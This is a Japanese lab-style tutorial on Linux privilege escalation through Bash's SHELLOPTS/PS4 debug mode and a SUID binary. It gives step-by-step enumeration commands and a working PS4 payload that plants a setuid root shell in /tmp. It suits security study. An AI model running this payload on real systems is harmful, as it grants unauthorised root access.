Bashにはデバッグモードがあり、-xコマンドラインオプションで有効にするか、SHELLOPTS環境変数を変更することで有効になります。
デフォルトでは、SHELLOPTSは読み取り専用ですが、envコマンドを使用することでSHELLOPTS を設定することができます。
デバッグモードでは、Bash は環境変数 PS4 を使用して、デバッグ文のための特別なプロンプトを表示します。
この変数は、表示されるたびに実行される埋め込みコマンドを含むことができます。
SUID ファイルが Bash 経由で他のプログラムを実行する場合 (例.system()を使うなどして）、これらの環境変数を継承することができます。   
SUID ファイルが実行されている場合、このコマンドはファイル所有者の特権で実行されます。  
Bashのバージョン4.4以降では、PS4環境変数は、root で実行するシェルには継承されません。   
# Privilege Escalation
1. ターゲット上のSUID/SGIDファイルを検索します。
```
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
2> /dev/null
...
-rwsr-sr-x 1 root staff 6899 May 14 2017 /usr/local/bin/suid-env2
...
```
suid-env2ファイルは、rootユーザの権限で実行する必要があります。   
2. SUIDファイルに対して文字列を実行します。  
```
$ strings /usr/local/bin/suid-env2
...
/usr/sbin/service apache2 start
```
このファイルは、/usr/sbin/service プログラムを実行しようとしている可能性があります。   
3. straceで確認することができます。   
```
$ strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep apache
[pid 16729] execve("/bin/sh", ["sh", "-c", "/usr/sbin/service apache2
start"]...
```
4. オプションで、ltraceで検証することも可能です。
```
$ ltrace /usr/local/bin/suid-env 2>&1 | grep service
system("service apache2 start"
```
これにより、サービスプログラムの実行にシステム機能が使用されていることがわかります。
5. /bin/shのバージョンを調べる
```
/bin/sh --version
```
version4.1.5なので脆弱性があることがわかる
6. bashのデバッグを有効にし、PS4変数にペイロードを代入して、SUIDファイルを実行します。
```
$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
```
7. tmp/rootbash ファイルに -p コマンドラインオプションを付けて実行すると、ルートシェルになります
```
$ /tmp/rootbash -p
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(pl
ugdev),1000(user)
```
